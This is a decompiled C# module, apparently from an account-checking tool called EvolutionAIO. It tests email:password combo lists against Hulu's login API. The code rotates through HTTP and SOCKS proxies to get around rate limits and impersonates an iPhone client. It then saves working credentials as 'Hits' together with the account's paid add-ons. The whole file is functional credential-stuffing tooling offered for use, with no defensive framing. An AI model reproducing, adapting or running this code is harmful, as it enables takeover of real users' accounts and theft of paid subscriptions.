// Decompiled with JetBrains decompiler
// Type: EvolutionAIO.Checkers.Hulu
// Assembly: EvolutionAIO, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FFBD76CC-A7A1-4682-B132-DAECA7C9FD32
// Assembly location: C:\Users\Pc\Downloads\Evolutionv2\EvolutionAIO.exe

using Leaf.xNet;
using System;
using System.Drawing;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text.RegularExpressions;

namespace EvolutionAIO.Checkers
{
  internal class Hulu
  {
    public static bool check(string[] s, string proxy)
    {
      if (0 >= Config.config.retries + 1)
        return false;
      try
      {
        using (HttpRequest httpRequest = new HttpRequest())
        {
          proxy = Menu.proxies.ElementAt<string>(new Random().Next(Menu.proxiesCount));
          if (Menu.proxyProtocol == "HTTP")
            httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(proxy);
          if (Menu.proxyProtocol == "SOCKS4")
            httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(proxy);
          if (Menu.proxyProtocol == "SOCKS5")
            httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(proxy);
          httpRequest.IgnoreProtocolErrors = true;
          httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36");
          string str1 = "affiliate_name=apple&friendly_name=Andy%27s+Iphone&password=" + s[1] + "&product_name=iPhone7%2C2&serial_number=00001e854946e42b1cbf418fe7d2dcd64df0&user_email=" + s[0];
          httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback) ((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
          HttpResponse httpResponse = httpRequest.Post("https://auth.hulu.com/v1/device/password/authenticate", str1, "application/x-www-form-urlencoded");
          Save.AsResult(nameof (Hulu), "R", httpResponse.ToString());
          if (httpResponse.ToString().Contains("user_token"))
          {
            string str2 = Regex.Match(httpResponse.ToString(), "user_token\":\"(.*)\",\"token_type").Groups[1].Value;
            httpRequest.ClearAllHeaders();
            httpRequest.AddHeader("Authorization", "Bearer " + str2);
            httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
            string str3 = Regex.Match(httpRequest.Get("https://home.hulu.com/v1/users/self").ToString(), "package_ids\":(.*),\"customer_type\"").Groups[1].Value;
            if (str3 == "[]")
            {
              ++Menu.frees;
              Save.AsResult(nameof (Hulu), "Frees", s[0] + ":" + s[1]);
              if (Menu.p1 == "2")
                Colorful.Console.Write(" [/] " + s[0] + ":" + s[1] + " | FREE\n", Color.Yellow);
              return false;
            }
            try
            {
              string[] strArray = str3.Split(',');
              string str4 = "";
              foreach (string str5 in strArray)
              {
                if (str5.Contains("14"))
                  str4 += "No Ads ";
                if (str5.Contains("16"))
                  str4 += "LiveTV ";
                if (str5.Contains("17"))
                  str4 += "HBO ";
                if (str5.Contains("18"))
                  str4 += "Cinemax ";
                if (str5.Contains("15"))
                  str4 += "Showtime ";
                if (str5.Contains("25"))
                  str4 += "Disney+ ";
              }
              if (str4 == null || str4 == "" || str4 == " ")
              {
                ++Menu.frees;
                Save.AsResult(nameof (Hulu), "Frees", s[0] + ":" + s[1]);
                if (Menu.p1 == "2")
                  Colorful.Console.WriteLine(" [/] " + s[0] + ":" + s[1] + " | FREE", Color.Yellow);
                return false;
              }
              ++Menu.hits;
              Save.AsResult(nameof (Hulu), "Hits", s[0] + ":" + s[1]);
              Save.AsResult(nameof (Hulu), "Capture", s[0] + ":" + s[1] + " | Subscription: " + str4);
              if (Menu.p1 == "2")
                Colorful.Console.WriteLine(" [+] " + s[0] + ":" + s[1] + " | Subscription: " + str4, Color.Aquamarine);
              return false;
            }
            catch
            {
              ++Menu.frees;
              Save.AsResult(nameof (Hulu), "Frees", s[0] + ":" + s[1]);
              if (Menu.p1 == "2")
                Colorful.Console.WriteLine(" FREE | " + s[0] + ":" + s[1], Color.Yellow);
              return false;
            }
          }
        }
      }
      catch (Exception ex)
      {
        if (ex.ToString().Contains("Index was outside the bounds of the array"))
          return false;
        ++Menu.errors;
      }
      return false;
    }
  }
}
